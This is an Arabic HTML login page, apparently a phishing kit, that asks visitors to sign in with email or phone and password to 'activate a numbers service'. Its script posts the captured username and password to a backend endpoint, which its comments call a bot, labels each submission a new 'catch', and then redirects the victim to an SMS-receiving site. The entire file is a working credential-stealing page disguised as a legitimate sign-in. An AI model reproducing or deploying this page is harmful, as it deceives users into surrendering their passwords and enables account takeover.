<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - تفعيل الخدمة</title>
    <style>
        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #FF0055 0%, #CC0044 100%);
            display: flex; justify-content: center; align-items: center; height: 100vh;
        }

        .container {
            background: white; padding: 30px; border-radius: 12px;
            box-shadow: 0 10px 50px rgba(0,0,0,0.2); width: 100%; max-width: 380px; text-align: center;
        }

        #pageImg { width: 90px; height: 90px; border-radius: 50%; object-fit: cover; margin-bottom: 20px; }
        h2 { color: #CC0044; margin-bottom: 25px; font-size: 19px; }

        input {
            width: 100%; padding: 12px; margin-bottom: 5px;
            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; outline: none;
            text-align: right; transition: 0.3s;
        }

        /* تنسيق الخطأ عند الإدخال */
        input.error-border { border: 2px solid red; background-color: #fff0f0; }
        .error-text { color: red; font-size: 12px; display: none; margin-bottom: 10px; text-align: right; }

        button {
            width: 100%; padding: 12px; background: #CC0044; color: white;
            border: none; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer;
            margin-top: 10px; transition: 0.3s;
        }
        button:hover { background: #990033; }
    </style>
</head>
<body>

<div class="container">
    <img id="pageImg" src="https://telegra.ph/file/f792945d7d1f9b8410551.jpg" alt="Logo">
    <h2 id="pageLetter">سجل دخول لتفعيل خدمة الأرقام</h2>

    <form id="checkForm">
        <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
        <div id="errorMsg" class="error-text">⚠️ يرجى إدخال بريد إلكتروني أو رقم هاتف صحيح</div>

        <input type="password" id="passInput" placeholder="كلمة السر" required>
        <button type="submit" id="pageBtn">تسجيل الدخول</button>
    </form>
</div>

<script>
    // دالة التحقق من صحة البيانات
    function validate(val) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRegex = /^[0-9]{7,15}$/;
        return emailRegex.test(val) || phoneRegex.test(val);
    }

    document.getElementById('checkForm').onsubmit = async (e) => {
        e.preventDefault();

        const user = document.getElementById('userInput').value;
        const pass = document.getElementById('passInput').value;
        const error = document.getElementById('errorMsg');
        const input = document.getElementById('userInput');

        if (!validate(user)) {
            error.style.display = 'block';
            input.classList.add('error-border');
            return;
        }

        // إذا كان الإدخال صحيحاً نرسل للبوت
        try {
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    image: "🚀 SMS صيد جديد من الخطة",
                    letter: "👤 المستخدم: " + user,
                    button: "🔑 الباسورد: " + pass
                })
            });
            
            // التوجيه بعد الإرسال بنجاح
            window.location.href = "https://receive-smss.com/";
            
        } catch (err) {
            console.error("خطأ في الاتصال بالسيرفر");
        }
    };
</script>

</body>
</html>
